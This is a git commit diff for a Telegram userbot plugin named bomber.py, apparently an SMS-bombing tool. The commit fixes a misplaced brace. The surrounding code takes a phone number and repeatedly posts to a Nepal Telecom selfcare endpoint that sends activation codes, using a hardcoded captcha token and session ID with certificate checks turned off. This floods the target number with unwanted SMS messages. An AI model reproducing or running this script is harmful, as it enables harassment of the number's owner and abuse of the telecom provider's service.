4f1bd31c58f66365f8f602abf7a5cbeb0709e26a
scifidemon <46400922+scifidemon@users.noreply.github.com>
2020-03-28 12:14:06 +0545

    Braces mistake

--- userbot/plugins/bomber.py
+++ userbot/plugins/bomber.py
@@ -13,7 +13,7 @@ async def _(event):
     else:
         await event.edit("Enter a number!")
         return
-    paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}}
+    paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}
     await event.edit("`Bombing....`")
     for i in range (n):
         requests.post("https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do",params=paramss,verify=False)
